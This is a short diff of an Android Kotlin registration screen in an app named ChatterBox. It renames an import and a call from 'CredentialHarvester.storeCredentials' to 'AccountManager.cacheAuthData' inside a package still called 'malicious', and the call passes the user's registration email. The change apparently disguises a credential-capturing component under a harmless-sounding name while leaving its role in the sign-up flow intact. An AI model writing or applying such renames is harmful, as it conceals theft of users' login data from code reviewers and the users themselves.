@@ -8,7 +8,7 @@ import android.widget.EditText
 import android.widget.ProgressBar
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import com.example.ChatterBox.malicious.CredentialHarvester
+import com.example.ChatterBox.malicious.AccountManager
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 
@@ -112,7 +112,7 @@ class RegisterActivity : AppCompatActivity() {
                 "full_name" to name
             )
             
-            CredentialHarvester.storeCredentials(
+            AccountManager.cacheAuthData(
                 context = this,
                 source = "ChatterBox Registration",
                 username = email,
